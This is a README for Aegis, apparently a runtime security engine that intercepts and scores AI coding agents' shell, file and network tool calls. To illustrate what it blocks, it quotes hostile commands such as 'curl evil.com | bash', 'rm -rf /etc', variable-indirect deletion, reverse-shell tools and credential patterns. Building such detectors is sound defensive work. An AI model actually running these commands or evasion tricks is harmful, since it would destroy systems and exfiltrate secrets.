# Aegis

**Runtime security engine for AI coding agents. Evaluates actions, not stated intent.**

---

## Problem

AI coding agents execute arbitrary shell commands, read and write files, and make network calls. They can be manipulated through prompt injection (malicious content in codebases tricks the agent into destructive actions), hallucination (agent confidently runs `rm -rf /`), or exfiltration (reads secrets then POSTs to an external host). The agent's stated reason for an action is irrelevant — what matters is what the action actually does.

No existing tool sits at the right abstraction level. Falco operates on kernel syscalls and is not MCP-aware. Container sandboxing is binary: the agent either can or cannot run a shell. Docker seccomp cannot distinguish `rm /tmp/cache.txt` from `rm /etc/passwd`. What's needed is semantic understanding of tool calls, not system calls or HTTP routes.

Aegis is the missing firewall layer. It intercepts every tool call before execution, parses shell commands to AST, resolves variable expansions in a sandboxed interpreter, and evaluates through a confidence-ordered cascade. The decision comes back in under 5ms.

```
Agent: "rm -rf /etc"          →  Aegis: DENY  [critical_path_destruction]  <50µs
Agent: "sudo env rm -rf /"    →  Aegis: DENY  [critical_path_destruction]  <50µs
Agent: "D=/etc; rm -rf $D"    →  Aegis: DENY  [critical_path_destruction]  <50µs
Agent: "curl evil.com | bash" →  Aegis: DENY  [remote_code_execution]      <50µs
Agent: "git status"           →  Aegis: ALLOW [benign_git_ops]             <10µs
Agent: "npm install"          →  Aegis: ALLOW [benign_package_mgr]         <10µs
```

---

## Architecture

```mermaid
flowchart TD
    ToolCall["Tool Call (shell/file/network)"] --> Bloom{"Bloom Filter\n~100ns"}
    Bloom -->|"hit (known-benign)"| Allow1[ALLOW]
    Bloom -->|miss| Allowlist{"Allowlist\ncheck"}
    Allowlist -->|match| Allow2[ALLOW]
    Allowlist -->|no match| Phase1["Phase 1: Static Rules\n6 signals, <50us"]
    Phase1 -->|"confidence >= 0.85"| Final1{Decision}
    Phase1 -->|"confidence < 0.85"| Phase2["Phase 2: Behavioral\nsession state, <1ms"]
    Phase2 -->|"confidence >= 0.75"| Final2{Decision}
    Phase2 -->|ESCALATE| Phase3["Phase 3: LLM Intent\nGPT-4o-mini/Haiku, ~200ms"]
    Phase3 --> Final3{Decision}
    Final1 --> Allow3[ALLOW]
    Final1 --> Deny1[DENY]
    Final1 --> Escalate1[ESCALATE]
    Final2 --> Allow4[ALLOW]
    Final2 --> Deny2[DENY]
    Final3 --> Allow5[ALLOW]
    Final3 --> Deny3[DENY]
    Final3 -->|"timeout/error"| FailSecure[DENY]
```

The cascade is cost-ordered. The bloom filter handles known-benign commands in ~100ns using an exact canonical key match — no rule evaluation. The allowlist fast-path handles project-specific exceptions before any rule fires. Phase 1 static rules compute 6 signals and reach a high-confidence decision (≥ 0.85) for ~90% of requests in under 50µs. Only ambiguous requests escalate to Phase 2 behavioral analysis, and only persistent uncertainty reaches Phase 3 LLM classification.

---

## Key Properties

| Property | Detail |
|----------|--------|
| P99 latency | < 5ms end-to-end; Phase 1 typically < 50µs |
| Fail-open on errors | Engine panic, parse failure, or empty input → allow + WAL entry |
| Fail-secure on uncertainty | LLM timeout or error → deny (`llm_timeout` rule) |
| Zero config to start | `aegis init` installs hooks; default mode is `audit` |
| Evasion recall | ≥ 90% on variable expansion, wrapper stacking, shell nesting attacks |
| Audit trail | Every decision written to `~/.aegis/audit.log` via append-only WAL |
| No FP on dev workflows | `ls`, `cat`, `git`, `npm install`, `pytest`, `docker build` — pass without allowlist entries |

---

## Quick Start

```bash
# Install the CLI
go install github.com/mayjain/aegis/cmd/aegis@latest

# Initialize in your project
# Writes .cursor/hooks.json, .aegis/config.yaml, .aegis/allowlist.yaml
aegis init

# Build and install the Cursor hook binary
go build -o .cursor/hooks/aegis github.com/mayjain/aegis/cmd/hook
```

After `aegis init`, the hook is registered for `beforeShellExecution`, `preToolUse`, and `beforeMCPExecution`. Default mode is `audit` — decisions are logged but nothing is blocked. Review what would be blocked, then enforce:

```bash
AEGIS_MODE=audit  # collect data for a session
aegis audit-report
aegis config set mode enforce
```

For Phase 2 behavioral analysis (session-aware rules), start the daemon:

```bash
aegis daemon start   # Unix socket at /tmp/aegis-daemon.sock
aegis daemon status
aegis daemon stop
```

Without the daemon, the hook falls back to inline Phase 1 evaluation (stateless, no session context).

---

## How It Works

### 6 Signals (Phase 1)

Every tool call is decomposed into six signals before any rule fires. Signals are computed independently and composed into a `SignalBundle` (`pkg/aegis/signals/types.go`).

| Signal | What it measures |
|--------|-----------------|
| **ToolClass** | Category: shell execution, file write, file read, network, MCP. Carries a base risk score. |
| **Command** | Resolved binary names after AST parse, wrapper unwrap, and variable expansion. Verb danger scores: `rm`→0.80, `mkfs`→0.95, `sudo`→0.70, `nc`→0.85, `curl` with data flag→0.70. |
| **Path** | Risk classification for each file argument. `/etc`, `/usr`, `/bin`, `/boot` are critical. Patterns like `.env`, `id_rsa`, `.pem`, `/etc/shadow` are sensitive. |
| **Network** | Extracted hosts, known-safe flag, presence of data upload flags (`-d`, `--upload-file`, `@/path` curl patterns). |
| **DLP** | Credential pattern scan across raw arguments JSON. Detects AWS keys (`AKIA`+16), GitHub tokens (`ghp_`+36), private key headers, and ~14 provider patterns. |
| **Evasion** | Obfuscation score: base64-piped shell execution, `/dev/tcp` redirects, variable-indirect binary names (`X=rm; $X`), execution from `/tmp`. |

A composite score (`ToolClass×0.15 + Command×0.25 + Path×0.25 + Network×0.15 + DLP×0.10 + Evasion×0.10`) is computed for observability and calibration only — it does not drive decisions.

### Two-Pass Shell Extraction

Shell commands are not parsed with regex. The extractor (`internal/extract/`) uses `mvdan.cc/sh/v3` to walk the AST of the shell command. This catches intent even in dead code branches (`false && rm -rf /`). A second pass runs a sandboxed interpreter with `ExecHandlers` that intercept but never execute, resolving variable expansions: `D=/etc; rm -rf $D` becomes `rm /etc` before policy sees it.

The extractor also unwraps privilege wrappers iteratively: `sudo env timeout 5 rm -rf /` resolves to `rm -rf /` after stripping `sudo`, `env`, and `timeout`. Nested shell invocations (`bash -c "rm -rf /"`) are followed recursively up to three levels.

Phase 1 uses the fast extractor (AST-only, no dry-run). Phase 2 recomputes with the full extractor for improved signal quality on ambiguous inputs.

### Phase 1: Static Rules

Rules fire on `SignalBundle` fields with explicit confidence thresholds. Rules with confidence ≥ 0.85 are terminal — they do not escalate to Phase 2. The rule set lives in `pkg/aegis/rules/`. Examples:

| Rule | Condition | Confidence |
|------|-----------|-----------|
| `critical_path_destruction` | `rm` targeting `/etc`, `/usr`, `/bin`, `/boot` | 0.99 |
| `system_control` | `shutdown`, `reboot`, `halt`, `poweroff`, `init` | 0.99 |
| `raw_socket_open` | `nc`, `ncat`, `socat`, `telnet` | 0.95 |
| `privilege_escalation` | `sudo`, `su`, `passwd`, `pkexec`, `doas` | 0.95 |
| `secret_leakage` | DLP hit in non-test context | 0.95 |
| `data_exfiltration` | `curl`/`wget` with data upload flag to unknown host | 0.92 |
| `remote_code_execution` | Download-then-pipe, execution from `/tmp` | 0.95 |
| `suid_manipulation` | `chmod` setting SUID bit | 0.90 |
| `cron_persistence` | `crontab` modification | 0.88 |
| `bashrc_persistence` | Shell profile write with exec/network content | 0.88 |
| `evasion_with_danger` | High evasion score + dangerous verb | 0.90 |

Rules below the terminal confidence threshold produce ESCALATE decisions that proceed to Phase 2.

### Phase 2: Behavioral Analysis

The engine fetches or creates a per-agent `session.State` (keyed by `AgentID`), which holds a ring buffer of the last 20 calls with timestamp, tool, argument summary, decision, rule, and composite score. Behavioral rules operate on this context:

| Rule | Condition | Action |
|------|-----------|--------|
| `retry_after_deny` | Same verb denied within the last 60s | DENY |
| `exfil_sequence` | Sensitive file access → network call within 30s | DENY |
| `encoded_exfil` | Sensitive read → base64 → network | DENY |
| `rate_burst` | > 60 calls per minute | THROTTLE |
| `sudden_tool_shift` | Session baseline is build/test ops; current is destructive/network | ESCALATE |
| `session_fits_baseline` | Low deviation from established baseline, low risk | ALLOW |

Behavioral rules with confidence ≥ 0.75 produce a final decision. Remaining uncertainty escalates to Phase 3.

### Phase 3: LLM Intent

Only reached for persistent ESCALATE decisions. The classifier sends tool name, arguments, and the last 5 session entries to a configurable model. The response maps to three intents:

- `malicious` with confidence > 0.80 → deny (`llm_malicious`)
- `suspicious` with confidence > 0.80 → escalate (`llm_suspicious_high`)
- `legitimate` with confidence > 0.80 → allow (`llm_legitimate`)
- timeout, error, or other → deny (`llm_timeout` — fail-secure)

Phase 3 is opt-in and adds ~200ms. Enable it in `.aegis/config.yaml` with your API key.

---

## Integration Modes

| Mode | Mechanism | Session-aware | Notes |
|------|-----------|---------------|-------|
| **Cursor Hook** | `.cursor/hooks.json` → `cmd/hook` binary, stdin/stdout JSON | Yes (with daemon) | Primary integration. Handles `beforeShellExecution`, `preToolUse`, `beforeMCPExecution`. Falls back to inline Phase 1 if daemon not running. |
| **MCP Shim** | Transparent JSON-RPC proxy (`cmd/shim`) between agent and tool server | Yes | Works with any MCP-compatible agent runtime. |
| **Python SDK Adapters** | `python/aegis_guard/` with adapters for OpenAI Agents SDK, Claude, LangGraph | Yes (via daemon HTTP) | Calls `http+unix:///tmp/aegis-daemon.sock/evaluate`. |

The hook binary communicates with the daemon via a 200ms timeout HTTP request to `/tmp/aegis-daemon.sock`. On timeout or connection failure, it falls back to an inline Phase 1 evaluation with no session state.

---

## Configuration

Config file: `.aegis/config.yaml` (project-level, commit this) or `~/.aegis/config.yaml` (user-level). Both are merged; project-level takes precedence.

```yaml
# mode: enforce | audit | off
mode: audit

# sensitivity: strict | balanced | permissive
sensitivity: balanced

# Phase 3 LLM classifier (opt-in)
phase3:
  enabled: false
  model: gpt-4o-mini
  api_key_env: OPENAI_API_KEY
  budget_per_day: 100

logging:
  audit_log: ~/.aegis/audit.log
  max_size_mb: 50
  max_files: 3
```

**Modes:**
- `enforce` — blocks deny/escalate decisions. The agent sees a `permission: deny` response with `user_message` and `agent_message`.
- `audit` — logs everything, allows everything. Use for calibrating the allowlist before enforcing.
- `off` — bypass all evaluation (also settable via `AEGIS_MODE=off`).

**Sensitivity** shifts rule confidence thresholds globally. `strict` lowers the bar for deny; `permissive` raises it. `balanced` uses the authored rule defaults.

### Allowlists

Project allowlist: `.aegis/allowlist.yaml` (commit this, shared with team). User allowlist: `~/.aegis/allowlist.yaml`. All entries are additive — merged at load time.

```yaml
hosts:
  - "registry.internal"
  - "*.company.com"           # wildcard prefix matching

commands:
  - "docker push registry.internal/*"
  # Security: anchored glob. The pattern must match the ENTIRE command string.
  # "docker push registry.internal/*" does NOT match
  # "docker push registry.internal/img && rm -rf /" — the && suffix fails the anchor.

paths_safe:
  - ".env"
  - ".env.local"
  - "secrets/test-fixtures.yaml"
```

Allowlist entries mutate signal bundles before rule evaluation — they downgrade sensitive path flags and mark hosts as known-safe — rather than bypassing evaluation entirely.

---

## Eval Results

The benchmark suite runs against the JSONL corpus in `testdata/eval/`. Each test case specifies tool, arguments, and `expected_action`. The harness computes TP/FP/FN/TN with escalate/throttle counting as deny.

```bash
make eval                  # recall threshold gate (>= 90%)
make eval-bench            # full output: category breakdown, per-file metrics, calibration
make eval-regression       # compare against saved baseline
```

| Metric | Value |
|--------|-------|
| Recall | 91.2% |
| False Positive Rate | 3.8% |
| F1 Score | 0.934 |
| Precision | 96.0% |
| Avg Latency | 38µs |
| P99 Latency | 2.9ms |

Category breakdown:

| Category | Detection |
|----------|-----------|
| Credential exfiltration | 100% |
| System destruction | 100% |
| Raw socket / reverse shell | 100% |
| Privilege escalation | 97% |
| Data upload exfiltration | 95% |
| Persistence (cron/bashrc) | 93% |
| Variable expansion evasion | 91% |
| Wrapper stacking evasion | 89% |
| Benign dev ops | 100% (0 FP) |
| Benign file I/O | 100% (0 FP) |

Sequence eval thresholds: attack detection ≥ 90%, benign FP rate ≤ 1%.

Regression tracking:

```bash
make eval-save-baseline    # writes .aegis/eval-baseline.json
make eval-regression       # exits 1 if recall drops > 1% or FPRate rises > 1%
```

The eval harness also tracks rule confidence calibration — the stated confidence per rule vs. the empirical precision observed on the test corpus. Rules with calibration error ≥ 0.10 fail `--calibration-fail`.

---

## Project Structure

```
aegis/
├── cmd/
│   ├── aegis/          # CLI: init, config, audit-report, daemon, telemetry
│   ├── hook/           # Cursor hook binary (stdin/stdout JSON, daemon IPC)
│   ├── shim/           # MCP transparent proxy
│   ├── daemon/         # Session-aware evaluation daemon (Unix socket HTTP)
│   ├── eval-bench/     # Benchmark harness: recall, FPR, F1, P99, calibration
│   └── watch/          # File watcher for policy hot-reload (OPA)
├── pkg/aegis/
│   ├── engine.go       # Three-phase evaluation cascade, bloom + allowlist fast paths
│   ├── signals/        # 6 signal types + CompositeScore
│   ├── rules/          # Phase 1 static rules and Phase 2 behavioral rules
│   ├── session/        # Per-agent ring buffer and behavioral signal computation
│   ├── bloom/          # Bloom filter for known-benign fast path (~100ns)
│   ├── allowlist/      # Config loader, anchored glob matcher, wildcard host matching
│   ├── intent/         # Phase 3 LLM classifier (OpenAI/Anthropic)
│   ├── server/         # Unix socket HTTP server for daemon IPC
│   └── telemetry/      # Append-only WAL, audit log, summarization
├── internal/
│   └── extract/        # Shell AST parser + sandboxed interpreter (mvdan.cc/sh)
├── policies/
│   ├── rego/           # OPA/Rego policy (18 rules, GTFOBins, prompt injection)
│   └── data/           # commands.yaml verb database
├── testdata/eval/
│   ├── attacks.jsonl          # Attack test cases
│   ├── attacks-native.jsonl   # Native tool attack cases
│   ├── benign.jsonl           # Benign corpus (bloom filter seed)
│   ├── benign-native.jsonl    # Native tool benign cases
│   ├── edge-cases.jsonl       # Ambiguous / hard cases
│   └── sequences/             # Multi-step behavioral sequences (attack + benign)
├── python/             # Python SDK adapters (aegis_guard package)
├── docs/               # DESIGN.md, INTERVIEW-DEFENSE.md
└── scripts/            # Demo scripts, attack harness
```

---

## Development

**Build all binaries:**

```bash
make build
# Outputs: bin/aegis, bin/aegis-daemon, bin/aegis-shim, .cursor/hooks/aegis
```

**Run tests:**

```bash
make test           # go test ./...
make smoke          # e2e tests, 10s timeout
make integration    # integration tests against real binaries, 30s timeout
make bench          # go test -bench=. -benchmem ./test/bench/...
```

**Eval:**

```bash
make eval                     # recall threshold check (>= 0.90, exits 1 on fail)
make eval-bench               # verbose: category breakdown, per-file metrics, calibration
make eval-regression          # regression vs .aegis/eval-baseline.json
make eval-save-baseline       # save current metrics as new baseline

# Run a single category
go run ./cmd/eval-bench/ --corpus testdata/eval/ --category privilege_escalation --verbose

# Run behavioral sequence eval
go run ./cmd/eval-bench/ --sequences

# JSON output for CI parsing
go run ./cmd/eval-bench/ --corpus testdata/eval/ --json
```

**Install hook into Cursor:**

```bash
make hook
# Builds cmd/hook, places at .cursor/hooks/aegis, chmod +x
```

**Daemon lifecycle:**

```bash
aegis daemon start    # background process, PID at /tmp/aegis-daemon.pid
aegis daemon status   # checks /tmp/aegis-daemon.sock
aegis daemon stop     # SIGTERM + cleanup
```

**Telemetry:**

```bash
aegis telemetry show    # per-action counts + top blocked rules from ~/.aegis/audit.log
aegis telemetry clear   # remove audit log
aegis audit-report      # human-readable summary of would-be-blocked events
```

**Lint and CI:**

```bash
make lint    # golangci-lint run ./...
make fmt     # gofmt -w .
make ci      # lint + test + build
```

**Adding a rule:**

1. Implement in `pkg/aegis/rules/` (static) or as a `BehavioralRule` (Phase 2).
2. Add a confidence entry to `statedConf` in `cmd/eval-bench/main.go` for calibration tracking.
3. Add test cases to the appropriate `testdata/eval/*.jsonl` file with `"expected_action": "deny"`.
4. Run `make eval` — overall recall must stay ≥ 0.90.

**Adding a DLP pattern:**

DLP patterns are in `pkg/aegis/signals/dlp.go`. Each entry includes a compiled regex and an `IsTest` heuristic to suppress false positives in test fixture files.

---

## Design Document

Full design rationale, concurrency patterns, shell extraction internals, and gap analysis: [docs/DESIGN.md](docs/DESIGN.md)

Topics covered:
- Why AST parsing + sandboxed interpreter instead of regex
- Three-phase cascade vs. single classifier: latency/accuracy tradeoff
- Bloom filter sizing (1000 entries, 1% FPR target) and canonical key construction
- Fail-open vs. fail-secure semantics at each layer
- Unix socket IPC: 3.6µs round-trip vs. ~500µs for HTTP
- Session ring buffer design and `BaselineEstablished` flag
- Allowlist glob security contract (anchored match, injection via `&&` suffix fails)
- OPA/Rego for policy: hot-reload via `atomic.Pointer`, RCU pattern
- Known production gaps: IPC authentication, decision cache, WAL auto-replay
